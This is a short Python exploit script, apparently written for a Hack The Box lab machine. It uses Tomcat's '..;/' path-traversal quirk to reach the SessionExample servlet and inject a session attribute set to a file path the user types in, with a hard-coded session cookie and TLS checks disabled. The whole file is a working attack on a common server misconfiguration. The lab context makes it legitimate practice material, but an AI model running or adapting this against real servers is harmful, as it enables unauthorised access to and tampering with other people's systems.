import requests

url_post = 'https://www.webhosting.htb/hosting/..;/examples/servlets/servlet/SessionExample'

user_input = input("File PATH: ")

headers_post = {
    # Add the required headers here, including the 'Cookie' header
    'Cookie': 'JSESSIONID=5CF6EC1181233E8AF41675A2EB738A0B',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = {
    'dataname': 's_EditingMedia_3B7x00a91V5dEVB8RVCDm-wkWlD5CnKSSFeaGi5nMbacsAB9N7S_Korom_-921k6SkoaKb4YkYBmGzwQYTEX1g==',
    'datavalue': user_input
}

# Disable SSL certificate verification by setting verify=False
response_post = requests.post(url_post, headers=headers_post, data=data, verify=False)

# Check the response status code
if response_post.status_code == 200:
    print("Request was successful.")
else:
    print(f"Request failed with status code: {response_post.status_code}")
